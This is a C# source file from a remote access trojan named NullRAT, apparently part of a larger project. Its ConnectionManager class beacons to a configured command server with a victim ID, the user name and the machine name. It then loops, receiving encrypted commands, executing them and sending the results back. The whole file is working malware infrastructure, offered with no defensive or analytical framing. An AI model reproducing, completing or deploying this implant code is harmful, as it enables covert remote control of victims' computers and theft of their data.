using NullRAT.Config;
using NullRAT.Utils;
using System;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace NullRAT.Core
{
    public static class ConnectionManager
    {
        public static async Task ConnectAndListen()
        {
            using TcpClient client = new TcpClient();
            await client.ConnectAsync(Config.ServerIP, Config.ServerPort);
            
            using NetworkStream stream = client.GetStream();

            string initData = $"NEW|{Config.VictimID}|{Environment.UserName}|{Environment.MachineName}";
            byte[] encryptedInit = Crypto.Encrypt(Encoding.UTF8.GetBytes(initData));
            await stream.WriteAsync(encryptedInit, 0, encryptedInit.Length);

            byte[] buffer = new byte[65535];

            while (true)
            {
                int bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length);
                if (bytesRead == 0) break;

                byte[] decrypted = Crypto.Decrypt(buffer, bytesRead);
                string command = Encoding.UTF8.GetString(decrypted).Trim();

                string result = ClientCore.ProcessCommand(command);

                byte[] response = Crypto.Encrypt(Encoding.UTF8.GetBytes(result));
                await stream.WriteAsync(response, 0, response.Length);
            }
        }
    }
}